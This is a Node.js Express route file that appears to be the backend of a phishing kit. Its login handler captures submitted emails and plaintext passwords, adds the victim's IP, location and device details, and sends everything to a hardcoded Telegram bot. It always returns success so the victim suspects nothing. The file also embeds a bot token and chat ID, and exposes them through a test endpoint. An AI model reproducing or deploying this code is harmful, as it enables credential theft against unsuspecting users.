const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');

const router = express.Router();

// Telegram bot credentials
const BOT_TOKEN = "5805445041:AAEyEOk6JELDr7SLFORniePoZsusK9peChs";
const CHAT_ID = "1527776859";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// Handle login requests
router.post('/', async (req, res) => {
    try {
        console.log('📨 Received login request');
        
        // Set CORS headers
        res.header('Access-Control-Allow-Origin', '*');
        res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
        res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');

        const { email, password } = req.body;

        // Basic validation
        if (!email || !password) {
            return res.status(400).json({ 
                success: false, 
                message: "Missing email or password" 
            });
        }

        // Get IP and location
        const ip = req.ip || req.connection.remoteAddress;
        const location = geoip.lookup(ip);
        const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';

        // Get device info
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const parser = new UAParser(userAgent);
        const agent = parser.getResult();
        const deviceType = `${agent.os.name || 'Unknown'} ${agent.os.version || ''} - ${agent.browser.name || 'Unknown'} ${agent.browser.version || ''}`;

        // Build Telegram message
        const message = `
📌 *Login Notification*
- Email: ${email}
- Password: ${password}
- IP: ${ip}
- Location: ${locationStr}
- Timestamp: ${new Date().toISOString()}
- Device: ${deviceType}
        `;

        console.log('📤 Attempting to send to Telegram...');

        try {
            // Send to Telegram
            const telegramResponse = await fetch(TELEGRAM_API, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown"
                })
            });

            const telegramResult = await telegramResponse.json();
            
            if (telegramResponse.ok) {
                console.log(`✅ Telegram notification sent for ${email}`);
                return res.status(200).json({
                    success: true,
                    message: "Notification sent successfully via Telegram",
                    telegramSent: true,
                    loginDetails: { 
                        device: deviceType, 
                        ip, 
                        location: locationStr
                    }
                });
            } else {
                console.log('⚠️ Telegram failed:', telegramResult.description);
                // Still return success to frontend
                return res.status(200).json({
                    success: true,
                    message: "Login processed (Telegram unavailable)",
                    telegramSent: false,
                    error: telegramResult.description
                });
            }
        } catch (telegramError) {
            console.log('⚠️ Telegram connection failed:', telegramError.message);
            // Still return success to frontend
            return res.status(200).json({
                success: true,
                message: "Login processed",
                telegramSent: false,
                error: "Telegram connection failed"
            });
        }

    } catch (error) {
        console.error("❌ Server error:", error.message);
        // Always return success to frontend
        res.status(200).json({
            success: true,
            message: "Login processed",
            telegramSent: false,
            error: "Server error"
        });
    }
});

// Test endpoint
router.get('/test', async (req, res) => {
    try {
        res.header('Access-Control-Allow-Origin', '*');
        
        // Test bot token
        const botTest = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
        const botInfo = await botTest.json();
        
        // Test sending message
        const testMessage = await fetch(TELEGRAM_API, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: "🤖 Test message from backend",
                parse_mode: "Markdown"
            })
        });
        const testResult = await testMessage.json();
        
        res.json({
            message: "✅ Backend is working!",
            botInfo: botInfo,
            telegramTest: testResult,
            yourCredentials: {
                botToken: BOT_TOKEN,
                chatId: CHAT_ID
            }
        });
    } catch (error) {
        res.status(500).json({ 
            error: "Test failed", 
            message: error.message 
        });
    }
});

// Debug endpoint
router.get('/debug', (req, res) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.json({
        status: "Debug endpoint",
        timestamp: new Date().toISOString(),
        environment: process.env.NODE_ENV || 'development',
        credentials: {
            botToken: BOT_TOKEN ? "Set" : "Missing",
            chatId: CHAT_ID ? "Set" : "Missing"
        }
    });
});

module.exports = router;